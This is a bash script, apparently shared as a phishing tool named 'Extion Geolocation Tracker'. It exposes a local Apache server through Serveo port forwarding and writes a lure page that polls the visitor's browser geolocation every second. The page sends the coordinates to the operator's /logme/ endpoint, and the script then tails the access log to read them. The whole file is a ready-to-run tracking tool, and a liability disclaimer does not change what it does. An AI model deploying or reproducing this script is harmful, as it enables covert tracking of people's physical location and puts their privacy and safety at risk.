#!/bin/bash

#Serveo to host page using remote port forwarding
xterm -e ssh -R 80:localhost:80 serveo.net & clear


echo "            

███████╗ ██╗  ██╗ ████████╗ ██╗  ██████╗  ███╗   ██╗
██╔════╝  ██║██║  ╚══██╔══╝ ██║ ██╔═══██╗ ████╗  ██║
█████╗     ██║       ██║    ██║ ██║   ██║ ██╔██╗ ██║
██╔══╝    ██╔██║     ██║    ██║ ██║   ██║ ██║╚██╗██║
███████╗ ██║  ██║    ██║    ██║ ╚██████╔╝ ██║ ╚████║
╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝  ╚═════╝  ╚═╝  ╚═══╝  GEOLOCATION TRACKER

[+] Author: Aryan
[+] Association : Extion Infotech
[+] Description: This tool is still under development and uses Serveo to find the exact location of the user during social engineering or phishing engagements, also if the individual found using this tool for illegal purposes, he/she should be only responsible for the consequences as Extion do not promote illegal attacks.
[+] Version: 2.0
[+] Date: 2025-07-13
[+] License: GNU General Public License v3.0
[+] Requirements: Apache2, Serveo, and a web browser to view the generated URL.
[+] Usage: Run this script and follow the instructions. It will generate a URL that you can use to track the user's location.
[+] Press Ctrl+C to stop the script at any time.                                                            

"
sleep 5
read -p 'Enter the URL generated by Serveo: ' varurl

echo "<!DOCTYPE html>
<html>
    <head>
        <title>I See you!</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"https://user-images.githubusercontent.com/3501170/55271108-d11b3180-52fb-11e9-97e2-c930be295147.png\");
                background-size: 1650px 1150px;
                background-repeat: no-repeat;
            }
        </style>
    </head>
    <body>
        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }
        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });
        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
service apache2 start

echo "   
███████╗ ██╗  ██╗ ████████╗ ██╗  ██████╗  ███╗   ██╗
██╔════╝  ██║██║  ╚══██╔══╝ ██║ ██╔═══██╗ ████╗  ██║
█████╗     ██║       ██║    ██║ ██║   ██║ ██╔██╗ ██║
██╔══╝    ██╔██║     ██║    ██║ ██║   ██║ ██║╚██╗██║
███████╗ ██║  ██║    ██║    ██║ ╚██████╔╝ ██║ ╚████║
╚══════╝ ╚═╝  ╚═╝    ╚═╝    ╚═╝  ╚═════╝  ╚═╝  ╚═══╝  GEOLOCATION TRACKER

[+] Author: Aryan
[+] Association : Extion Infotech
[+] Description: This tool is still under development and uses Serveo to find the exact location of the user during social engineering or phishing engagements, also if the individual found using this tool for illegal purposes, he/she should be only responsible for the consequences as Extion do not promote illegal attacks.                                                           
" > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
